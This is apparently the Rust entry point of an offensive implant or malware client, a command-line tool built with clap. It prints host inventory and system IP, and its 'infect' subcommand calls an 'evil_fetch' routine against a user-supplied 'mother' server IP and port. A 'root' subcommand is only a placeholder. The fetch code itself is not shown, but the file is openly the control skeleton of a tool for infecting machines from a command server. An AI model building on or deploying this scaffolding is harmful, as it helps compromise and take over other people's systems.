pub mod client;
use crate::client::types::{Host, OS};

use clap::{arg, command, value_parser, Command};

#[tokio::main]
async fn main() {
    let matches = command!()
        // .arg(arg!(-s --show "Returns ip of system").required(false))
        .subcommand(Command::new("ip").about("Returns ip of system"))
        .arg(arg!(-i --inventory "Gets Host inventory").required(false))
        .subcommand(
            Command::new("infect")
                .about("Performs the infect operation")
                .arg(
                    // set mother ip arg
                    arg!(-m --mother <TARGET> "Specifies the target for the infect operation")
                        .required(true)
                        .value_parser(value_parser!(std::net::IpAddr)),
                )
                .arg(
                    arg!(-p --port <PORT> "Specifies the port for the infect operation")
                        .required(true)
                        .value_parser(value_parser!(u16)),
                ),
        )
        .subcommand(
            Command::new("root")
                .about("Executes the root operation")
                .arg(
                    arg!(-p --path <PATH> "Specifies the path for the root operation")
                        .required(false),
                ),
        )
        .get_matches();

    if matches.get_flag("inventory") {
        println!("{}", Host::new().to_json());
    }
    match matches.subcommand() {
        Some(("infect", sub_matches)) => {
            let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
            let port = sub_matches.get_one::<u16>("port").unwrap();


            match client::client::evil_fetch(mother_ip, port).await {
                Ok(_) => println!("Infect operation successful"),
                Err(_) => println!("Infect operation failed"),
            }
        }
        Some(("root", sub_matches)) => {
            if let Some(path) = sub_matches.get_one::<String>("path") {
                println!("Root operation with path: {}", path);
            } else {
                println!("Root operation without specific path");
            }
        }
        Some(("ip", _)) => println!("{}", Host::ip()),
        _ => {}
    }
}
